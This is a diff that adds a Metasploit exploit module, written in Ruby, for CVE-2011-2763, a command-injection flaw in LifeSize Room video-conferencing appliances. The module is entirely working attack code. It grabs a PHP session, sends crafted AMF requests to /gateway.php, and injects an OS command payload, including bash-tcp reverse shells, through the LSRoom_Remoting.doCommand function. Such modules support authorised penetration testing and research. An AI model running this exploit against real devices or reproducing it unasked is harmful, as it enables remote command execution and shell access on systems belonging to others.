@@ -1,0 +1,96 @@
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'LifeSize Room Command Injection',
+			'Description'    => %q{
+				This module exploits a vulnerable resource in LifeSize
+				Room  versions 3.5.3 and 4.7.18 to inject OS commmands.  LifeSize
+				Room is an appliance and thus the environment is limited
+				resulting in a small set of payload options.
+			},
+			'Author'	=> 
+				[
+					'Spencer McIntyre',
+					# Special Thanks To Chris Murrey
+					'SecureState R&D Team'
+				],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 6 $',
+			'References'     =>
+				[
+					[ 'CVE', '2011-2763' ],
+				],
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'DisableNops' => true,
+					'Space'       => 65535,	# limited by the two byte size in the AMF encoding
+					'Compat'      =>
+						{
+							'PayloadType' => 'cmd cmd_bash',
+							'RequiredCmd' => 'generic bash-tcp',
+						}
+				},
+			'Platform'       => [ 'unix' ],
+			'Arch'           => ARCH_CMD,
+			'Targets'        => [ [ 'Automatic', { } ] ],
+			'DisclosureDate' => 'July 13 2011',
+			'DefaultTarget'  => 0))
+			
+		register_advanced_options(
+			[
+				OptString.new('UserAgent', [true, 'The User-Agent header to use for all requests', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.17) Gecko/20110428 Fedora/3.6.17-1.fc14 Firefox/3.6.17'])
+			], self.class)
+
+	end
+
+	def exploit
+		print_status("Requesting PHP Session...")
+		res = send_request_cgi({
+			'encode'	=>	false,
+			'uri'		=> 	"/interface/interface.php?uniqueKey=#{rand_text_numeric(13)}",
+			'method'	=>	'GET',
+		}, 10)
+		if not res.headers['set-cookie']
+			print_error('Could Not Obtain A Session ID')
+			return
+		end
+		
+		sessionid = 'PHPSESSID=' << res.headers['set-cookie'].split('PHPSESSID=')[1].split('; ')[0]
+		headers = {
+			'Cookie' 		=> sessionid,
+			'Content-Type'	=> 'application/x-amf',
+		}
+		
+		print_status("Validating PHP Session...")
+		res = send_request_cgi({
+				'encode'	=> false,
+				'uri'		=> '/gateway.php',
+				'data'		=> "\x00\x00\x00\x00\x00\x02\x00\x1bLSRoom_Remoting.amfphpLogin\x00\x02/1\x00\x00\x00\x05\x0a\x00\x00\x00\x00\x00\x17LSRoom_Remoting.getHost\x00\x02\x2f\x32\x00\x00\x00\x05\x0a\x00\x00\x00\x00",
+				'method'	=> 'POST',
+				'headers'	=> headers,
+		})
+		if not res
+			print_error('Could Not Validate The Session ID')
+			return
+		end
+		
+		print_status("Sending Malicious POST Request...")
+		# This is the amf data for the request to the vulnerable function LSRoom_Remoting.doCommand
+		amf_data = "\x00\x00\x00\x00\x00\x01\x00\x19LSRoom_Remoting.doCommand\x00\x02\x2f\x37\xff\xff\xff\xff\x0a\x00\x00\x00\x02\x02#{[payload.encoded.length].pack('n')}#{payload.encoded}\x02\x00\x0dupgradeStatus"
+		res = send_request_cgi({
+				'encode'	=> false,
+				'uri'		=> '/gateway.php?' << sessionid,
+				'data'		=> amf_data,
+				'method'	=> 'POST',
+				'headers'	=>	headers
+		}, 10)
+	end
+	
+end
